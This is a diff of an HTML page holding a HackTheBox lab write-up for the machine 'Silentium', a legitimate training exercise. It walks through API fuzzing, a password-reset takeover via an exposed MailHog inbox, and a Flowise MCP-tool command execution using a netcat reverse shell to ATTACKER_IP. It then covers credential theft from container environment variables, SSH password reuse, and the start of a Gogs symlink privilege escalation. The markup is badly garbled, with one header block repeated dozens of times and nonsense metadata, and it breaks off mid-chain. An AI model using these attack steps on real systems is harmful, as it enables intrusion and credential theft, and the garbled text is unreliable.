@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Silentium • HTB Writeup</title>
+    <title>Silentium - HackTheBox Writeup • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -17,66 +17,1283 @@
             padding: 2rem;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             width: 100%;
             background: rgba(12, 16, 28, 0.9);
             border: 1px solid rgba(0, 255, 200, 0.15);
             border-radius: 2rem;
             padding: 3rem;
-            text-align: center;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
         h1 {
             font-size: 2.5rem;
             color: #6fffe0;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
+        .meta-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem 2rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
             border-radius: 1rem;
+            margin-bottom: 2rem;
         }
-        .status i {
-            color: #ffcc00;
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        
+        .ascii-art {
+            text-align: center;
+            opacity: 0.3;
+            font-size: 0.5rem;
+            line-height: 1.2;
+            color: #6fffe0;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        
+        .cve-tag {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            color: #ff6666;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
             margin-right: 0.5rem;
         }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
+        .highlight {
+            background: rgba(0, 255, 200, 0.05);
+            border: 1px solid rgba(0, 255, 200, 0.1);
+            border-radius: 0.5rem;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+        }
+        .attack-chain {
+            background: rgba(0, 255, 200, 0.02);
+            border: 1px solid rgba(0, 255, 200, 0.1);
             border-radius: 1rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
             color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
+            line-height: 1.8;
+            overflow-x: auto;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Silentium</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+
+<div class="container">
+    
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
     </div>
+Silentium - HackTheBox Writeup</h1>
+
+<p><strong>Target:</strong> <code>TARGET_IP</code></p>
+<p><strong>Domain:</strong> <code>silentium.htb</code></p>
+<p><strong>OS:</strong> Linux (Docker-based with Gogs)</p>
+<p><strong>Difficulty:</strong> Medium/Hard</p>
+
+<hr />
+
+<div class="attack-chain"><pre>## Attack Chain Overview
+
+```</pre></div>
+<p>Subdomain Discovery (staging.silentium.htb)</p>
+<p>    ↓</p>
+<p>API Endpoint Enumeration (auth/login, ping, pricing, version)</p>
+<p>    ↓</p>
+<p>Password Reset Flow → MailHog Interception → Token Capture</p>
+<p>    ↓</p>
+<p>Flowise Low-Code Platform → Custom MCP Tool RCE</p>
+<p>    ↓</p>
+<p>Container Reverse Shell (root in Alpine container)</p>
+<p>    ↓</p>
+<p>Environment Variable Enumeration → SMTP Password Reuse</p>
+<p>    ↓</p>
+<p>SSH Access as ben → User Flag</p>
+<p>    ↓</p>
+<p>Gogs Service (CVE-2024-55947 bypass) → Symlink Attack</p>
+<p>    ↓</p>
+<p>Write to /root/.ssh/authorized_keys → SSH as root → Root Flag</p>
+<pre><code>
+---
+
+## Table of Contents
+1. [Reconnaissance](#reconnaissance)
+2. [Initial Access](#initial-access)
+3. [Container Enumeration](#container-enumeration)
+4. [Host Access](#host-access)
+5. [User Flag](#user-flag)
+6. [Privilege Escalation](#privilege-escalation)
+7. [Root Flag](#root-flag)
+8. [Key Takeaways](#key-takeaways)
+
+---
+
+## Reconnaissance
+
+### Host Setup</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: add the target domain names to the local hosts file.</h1>
+<div class="attack-chain"><pre># Why here: enable proper resolution for virtual hosts used in the attack chain.
+echo "TARGET_IP silentium.htb" | sudo tee -a /etc/hosts
+```</pre></div>
+
+<h3>Subdomain Discovery</h3>
+
+<pre><code># What it does: enumerate virtual hosts using Gobuster.
+# Why here: find hidden subdomains like staging.silentium.htb that are not linked from the main site.
+gobuster vhost -u http://silentium.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  --append-domain</code></pre>
+
+<p><strong>Result:</strong> <code>staging.silentium.htb</code> discovered.</p>
+
+<div class="attack-chain"><pre># Why here: enable proper resolution for virtual hosts used in the attack chain.
+echo "TARGET_IP staging.silentium.htb" | sudo tee -a /etc/hosts
+```</pre></div>
+<pre><code># What it does: add the target domain names to the local hosts file.
+
+### API Endpoint Enumeration
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: fuzz the API endpoints using ffuf.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: map out the staging API to find authentication and password reset routes.</h1>
+<p>ffuf -u http://staging.silentium.htb/api/v1/FUZZ \</p>
+<p>  -w /usr/share/seclists/Discovery/Web-Content/api-endpoints-res.txt \</p>
+<p>  -fc 404 -fw 2</p>
+<pre><code>
+**Discovered Endpoints:**
+
+| Endpoint        | Description                           |
+|-----------------|---------------------------------------|
+| `auth/login`    | Authentication endpoint               |
+| `auth/reset-password` | Password reset functionality     |
+| `ping`          | Health check endpoint                 |
+| `pricing`       | Pricing information                   |
+| `version`       | API version information               |
+| `ip`            | IP address endpoint                   |
+
+---
+
+## Initial Access
+
+### Password Reset Flow Exploitation
+
+The `staging.silentium.htb` application uses **MailHog** (a development email testing tool) to handle password reset emails. MailHog exposes a web UI that allows anyone to view all "sent" emails — including password reset tokens.
+
+**Attack Flow:**</code></pre>
+<p>Request password reset for ben@silentium.htb</p>
+<p>    ↓</p>
+<p>Reset token sent to MailHog (not real email)</p>
+<p>    ↓</p>
+<p>Access MailHog UI → Capture reset token</p>
+<p>    ↓</p>
+<p>Use token to reset password → Account takeover</p>
+<pre><code>
+### Step 1 — Request Password Reset
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: trigger a password reset request for Ben's account.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: initiate the reset flow so the token can be intercepted in MailHog.</h1>
+<p>curl -X POST http://staging.silentium.htb/api/v1/auth/forgot-password \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{"email":"ben@silentium.htb"}'</p>
+<pre><code>
+### Step 2 — Capture Reset Token from MailHog
+
+MailHog typically runs on port `8025`. Access the web UI:
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: query the MailHog API for captured emails.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: intercept the password reset token sent by the staging application.</h1>
+<p>curl http://staging.silentium.htb:8025/api/v2/messages</p>
+<pre><code>
+**Extract the reset token** from the email body. The token is a temporary authentication string used to verify the password reset request.
+
+### Step 3 — Reset Password
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: submit the reset-password request with the captured token.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: finalize the account takeover by setting a new password for Ben.</h1>
+<p>curl -X POST http://staging.silentium.htb/api/v1/auth/reset-password \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{</p>
+<p>    "user": {</p>
+<p>      "email": "ben@silentium.htb",</p>
+<p>      "tempToken": "<CAPTURED_TOKEN>",</p>
+<p>      "password": "NuevaPassword123!"</p>
+<p>    }</p>
+<p>  }'</p>
+<pre><code>
+**Result:** ✅ Password for `ben@silentium.htb` successfully reset.
+
+### Step 4 — Login
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: authenticate against the API with the new credentials.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: obtain an authentication token and gain access to the Flowise platform.</h1>
+<p>curl -X POST http://staging.silentium.htb/api/v1/auth/login \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{"email":"ben@silentium.htb","password":"NuevaPassword123!"}'</p>
+<pre><code>
+**Credentials:**
+- **Email:** `ben@silentium.htb`
+- **Password:** `NuevaPassword123!`
+
+---
+
+## Flowise RCE
+
+### What is Flowise
+
+Flowise is an open-source **low-code/no-code platform for building AI agents and workflows**. It allows users to create "agent flows" using a drag-and-drop interface. The platform supports custom tools, including MCP (Model Context Protocol) tools that can execute arbitrary commands.
+
+### Exploitation Steps
+
+**1. Navigate to Agentflows**
+
+After logging in, access the **Agentflows** section → **Agent Flow V2**.
+
+**2. Create Custom MCP Tool**
+
+Add a **Custom MCP Tool** node to the flow. This tool allows specification of a command and arguments that will be executed by the Flowise server.
+
+**3. Craft Reverse Shell Payload**
+</code></pre>
+<p>{</p>
+<p>  "command": "sh",</p>
+<p>  "args": ["-c", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f"]</p>
+<p>}</p>
+<pre><code>
+**Payload Breakdown:**
+- `rm /tmp/f` — Remove any existing FIFO file
+- `mkfifo /tmp/f` — Create a named pipe (FIFO) for bidirectional communication
+- `cat /tmp/f | /bin/sh -i 2>&1` — Read from pipe, execute shell, redirect stderr to stdout
+- `nc ATTACKER_IP 4444 >/tmp/f` — Send shell output to attacker, write input back to pipe
+
+**4. Set up Listener**</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: start a netcat listener.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: catch the reverse shell connection from the Flowise Alpine container.</h1>
+<p>nc -lvnp 4444</p>
+<pre><code>
+**5. Trigger Execution**
+
+Click **Refresh** or **Run** on the agent flow to execute the custom tool.
+
+**6. Reverse Shell Received:**</code></pre>
+<p>connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444</p>
+<p>/ # </p>
+<pre><code>
+**✅ Initial access achieved as `root` inside an Alpine Linux container (`CONTAINER_IP`).**
+
+---
+
+## Container Enumeration
+
+### Container Identification
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check hostname</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: check the container hostname.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: confirm the execution context (container ID vs. host name) after establishing the reverse shell.</h1>
+<p>hostname</p>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+CONTAINER_IP</h1>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check OS</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: audit the operating system release details.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: identify the Alpine Linux environment which often lacks standard binaries but uses specific package managers.</h1>
+<p>cat /etc/os-release</p>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Alpine Linux</h1>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check user</h1>
+<p>id</p>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+uid=0(root) gid=0(root) groups=0(root)</h1>
+<pre><code>
+**Important Note:** We are `root` **inside a container**, not on the host system. We need to enumerate the container to find a path to the host.
+
+### Network Discovery
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check network interfaces</h1>
+<p>ip addr</p>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+eth0: CONTAINER_IP/16</h1>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+ARP scan for other containers</h1>
+<p>arp -a</p>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+DOCKER_GW (gateway/host)</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+SIBLING_CONTAINER_IP (another container)</h1>
+<pre><code>
+**Internal Network Map:**
+
+| IP            | Service          | Description                    |
+|---------------|------------------|--------------------------------|
+| `DOCKER_GW`  | Host / Gateway   | Docker host machine            |
+| `CONTAINER_IP`  | Flowise          | Our container (AI workflow)    |
+| `SIBLING_CONTAINER_IP`  | MailHog          | Email testing service          |
+
+### Environment Variable Enumeration
+
+Process environment variables often contain credentials, API keys, and configuration secrets:
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: extract the environment variables of the init process.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: recover hardcoded credentials like SMTP_PASSWORD and FLOWISE_PASSWORD used for the platform setup.</h1>
+<p>cat /proc/1/environ | tr '\0' '\n'</p>
+<pre><code>
+**Key Findings:**
+
+| Variable             | Value              | Description                      |
+|----------------------|--------------------|----------------------------------|
+| `FLOWISE_USERNAME`   | `ben`              | Flowise admin username           |
+| `FLOWISE_PASSWORD`   | `F1l3_d0ck3r`      | Flowise admin password           |
+| `SMTP_PASSWORD`      | `r04D!!_R4ge`      | SMTP server password             |
+
+### Service Enumeration Inside Container
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check running processes</h1>
+<p>ps aux</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check mounted filesystems</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: audit active mount points inside the container.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: check for host-to-container volume mappings that might expose sensitive host directories.</h1>
+<p>mount</p>
+
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check for interesting files</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: search for configuration and secret files inside the container.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: locate secondary credential sources or sensitive environment configuration.</h1>
+<p>find / -type f -name "<em>.env" -o -name "</em>.conf" -o -name "*.ini" 2>/dev/null</p>
+<pre><code>
+---
+
+## Host Access
+
+### SSH with Reused Credentials
+
+The `SMTP_PASSWORD` discovered in the container environment variables was **reused** for the `ben` user account on the host system.
+
+**Credentials:**
+- **Username:** `ben`
+- **Password:** `r04D!!_R4ge`
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: log in as Ben on the host system.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: leverage credential reuse to pivot from the container to the host.</h1>
+<p>ssh ben@TARGET_IP</p>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Password: r04D!!_R4ge</h1>
+<pre><code>
+**✅ SSH access achieved as `ben` on the host system.**
+
+---
+
+## User Flag
+</code></pre>
+<p>ben@silentium:~$ cat /home/ben/user.txt</p>
+<pre><code>
+**User Flag:** `6ffdefce00f8b7db6a3cd9a8d393958f`
+
+---
+
+## Privilege Escalation
+
+### Gogs Service Discovery
+
+After gaining SSH access as `ben`, enumerate the host system:
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Check running processes</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: identify active Gogs processes.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: verify that Gogs is running with root privileges, indicating a potential symlink-based escalation vector.</h1>
+<p>ps aux | grep -i gogs</p>
+<pre><code>
+**Result:** Gogs (Go Git Service) is running as **root**:
+</code></pre>
+<p>root  1528  /opt/gogs/gogs/gogs web</p>
+<pre><code>
+### What is Gogs
+
+Gogs is a self-hosted Git service similar to GitHub. It provides web-based repository management, user authentication, and API access. Running Gogs as root is a **misconfiguration** that can be exploited for privilege escalation.
+
+### Gogs Configuration
+</code></pre>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+What it does: read the Gogs main configuration file.</h1>
+<h1>Silentium - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Silentium</span>
+        <span><strong>Difficulty:</strong> access</span>
+        <span><strong>Target Ports:</strong> 3001</span>
+        <span><strong>OS:</strong> for</span>
+    </div>
+Why here: extract database connection strings and verify the repository storage path for root-level access.</h1>
+<p>cat /opt/gogs/gogs/custom/conf/app.ini</p>
+<pre><code>
+**Key Configuration:**
+
+| Setting          | Value                |
+|------------------|----------------------|
+| Version          | `0.13.3`             |
+| Listen Address   | `127.0.0.1:3001`     |
+| Repository Path  | `/root/gogs-repositories` |
+
+**Critical Finding:** Gogs is only listening on `127.0.0.1:3001` — not accessible externally. We need to tunnel into it.
+
+### Vulnerability Analysis
+
+**CVE-2024-55947:** A symlink bypass vulnerability in Gogs allows attackers to write arbitrary files through the API by creating a symlink to a sensitive file (like `/root/.ssh/authorized_keys`) and then writing to it through the repository contents API.
+
+**Exploit Chain:**</code></pre>
+<p>SSH Tunnel to Gogs (port 3001)</p>
+<p>    ↓</p>
+<p>Create Gogs Account → Create Repository</p>
+<p>    ↓</p>
